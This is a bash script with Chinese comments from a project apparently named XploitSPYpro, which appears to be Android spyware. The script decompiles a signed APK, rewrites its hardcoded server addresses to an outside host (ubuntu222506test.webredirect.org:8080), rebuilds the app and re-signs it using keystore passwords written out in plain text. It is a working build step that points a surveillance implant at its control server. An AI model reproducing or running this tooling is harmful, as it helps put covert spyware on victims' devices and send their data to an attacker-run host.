#!/bin/bash
# 修复 APK 源文件 - 确保使用正确的服务器URL重新反编译

PROJECT_DIR="/home/test1/XploitSPYpro-main202605100042/XploitSPYpro-main"
FACTORY_DIR="$PROJECT_DIR/server/app/factory"
DEcompiled_DIR="$FACTORY_DIR/decompiled"
APKTOOL="$FACTORY_DIR/apktool.jar"

echo "=========================================="
echo "修复 APK 源文件 URL"
echo "=========================================="

# 检查必要文件
if [ ! -f "$APKTOOL" ]; then
    echo "错误: 未找到 apktool.jar"
    exit 1
fi

cd "$FACTORY_DIR"

# 方法1: 如果存在已签名的APK，从中提取并修改
if [ -f "build-aligned-signed.apk" ]; then
    echo ""
    echo "方法1: 从现有APK中提取并修改URL..."
    
    # 创建临时目录
    mkdir -p temp_fix
    cd temp_fix
    
    # 反编译现有APK
    echo "反编译APK..."
    java -jar "$APKTOOL" d -f -o decompiled ../build-aligned-signed.apk
    
    # 查找并替换URL
    echo "查找并替换URL..."
    find decompiled/smali -name "*.smali" -exec grep -l "http://localhost:80" {} \; | while read file; do
        echo "修复文件: $file"
        sed -i 's|http://localhost:80|http://ubuntu222506test.webredirect.org:8080|g' "$file"
    done
    
    # 查找其他可能的本地地址
    find decompiled/smali -name "*.smali" -exec grep -l "http://127.0.0.1:80" {} \; | while read file; do
        echo "修复文件: $file"
        sed -i 's|http://127.0.0.1:80|http://ubuntu222506test.webredirect.org:8080|g' "$file"
    done
    
    # 查找xwizer地址
    find decompiled/smali -name "*.smali" -exec grep -l "xwizer.herokuapp.com:80" {} \; | while read file; do
        echo "修复文件: $file"
        sed -i 's|http://xwizer.herokuapp.com:80|http://ubuntu222506test.webredirect.org:8080|g' "$file"
    done
    
    # 重新编译
    echo "重新编译APK..."
    java -jar "$APKTOOL" b decompiled -o ../app-release-fixed.apk
    
    cd ..
    
    # 签名
    echo "签名APK..."
    java -jar uber-apk-signer-1.1.0.jar \
        -a app-release-fixed.apk \
        --ks release.jks --ksAlias key0 \
        --ksPass release101 --ksKeyPass release101 \
        --ksType JKS --allow-resign --overwrite \
        -o .
    
    # 移动为新的源APK
    mv build-aligned-signed.apk build-aligned-signed.apk.backup
    mv app-release-fixed-aligned-signed.apk build-aligned-signed.apk
    
    # 清理
    rm -rf temp_fix app-release-fixed.apk
    
    echo ""
    echo "✓ APK已修复"
    
    # 验证
    echo ""
    echo "验证APK中的URL:"
    unzip -p build-aligned-signed.apk classes.dex | strings | grep "http://" | head -5
    
else
    echo "错误: 未找到 build-aligned-signed.apk"
    exit 1
fi

echo ""
echo "=========================================="
echo "修复完成!"
echo "=========================================="
